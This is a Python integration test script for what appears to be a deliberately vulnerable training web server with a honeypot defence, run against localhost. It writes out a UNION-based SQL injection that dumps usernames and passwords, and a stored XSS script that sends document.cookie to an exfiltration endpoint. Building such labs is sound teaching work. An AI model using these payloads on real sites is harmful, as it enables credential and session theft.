import sys
import time
import threading
import urllib.request
import urllib.parse
import json
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BASE_DIR))

from part3_webserver.server import app

# Start test server in background thread
threading.Thread(target=lambda: app.run(port=8089, debug=False, use_reloader=False), daemon=True).start()
time.sleep(1.0)

base = "http://127.0.0.1:8089"

# 1. Test Registration
reg_data = urllib.parse.urlencode({
    "full_name": "TS. Nguyen Van A - Hoi Dong",
    "username": "thay_phan_bien_01",
    "password": "Password123!",
    "role": "Uy Vien Phan Bien 1"
}).encode()
req = urllib.request.Request(f"{base}/register", data=reg_data)
resp = urllib.request.urlopen(req)
print(f"[✓] Register test: OK, status: {resp.status}")

# 2. Test SQLi Extraction of newly registered account
sqli_url = f"{base}/api/data?query=" + urllib.parse.quote("' UNION SELECT id, username, password, full_name, role, balance FROM users --")
req2 = urllib.request.Request(sqli_url)
with urllib.request.urlopen(req2) as r:
    data = json.loads(r.read().decode())
    leaked = data.get("leaked_database", [])
    new_acc = [u for u in leaked if u.get("username") == "thay_phan_bien_01"]
    assert len(new_acc) == 1, "Newly registered account not found in SQLi leak!"
    assert new_acc[0]["is_new"] == True, "is_new flag not set!"
    print(f"[✓] SQLi Live Account Exfiltration test: OK, extracted {len(leaked)} accounts, found new account: {new_acc[0]}")

# 3. Test Stored XSS & Cookie Exfiltration
xss_data = urllib.parse.urlencode({
    "author": "RedTeam",
    "content": "<script>alert(1); fetch('/api/xss/exfiltrate?cookie=' + document.cookie);</script>"
}).encode()
req3 = urllib.request.Request(f"{base}/api/comment", data=xss_data)
with urllib.request.urlopen(req3) as r:
    xss_res = json.loads(r.read().decode())
    print(f"[✓] XSS injection test: OK, status: {xss_res.get('status')}")

# Exfiltrate cookie test
req4 = urllib.request.Request(f"{base}/api/xss/exfiltrate?cookie=SEC_TOKEN_thay_phan_bien_01_a9f1b2&ua=ChromeMobile")
with urllib.request.urlopen(req4) as r:
    print("[✓] Cookie capture test: OK")

# Verify stolen cookie in list
with urllib.request.urlopen(f"{base}/api/xss/stolen_cookies") as r:
    stolen_data = json.loads(r.read().decode())
    assert stolen_data.get("total") >= 1
    print(f"[✓] Attacker pull stolen cookies test: OK, cookies: {stolen_data.get('stolen_cookies')}")

# 4. Test Honeypot Counter-attack
urllib.request.urlopen(urllib.request.Request(
    f"{base}/api/hips/counter_action",
    data=json.dumps({"action": "HONEYPOT", "ip": "127.0.0.1"}).encode(),
    headers={"Content-Type": "application/json"}
))
with urllib.request.urlopen(req2) as r:
    honeypot_res = json.loads(r.read().decode())
    assert honeypot_res.get("is_honeypot") == True
    print("[✓] Honeypot counter-attack test: OK, returned honeypot canary decoy!")

print("\nALL SERVER INTEGRATION TESTS PASSED 100%!")
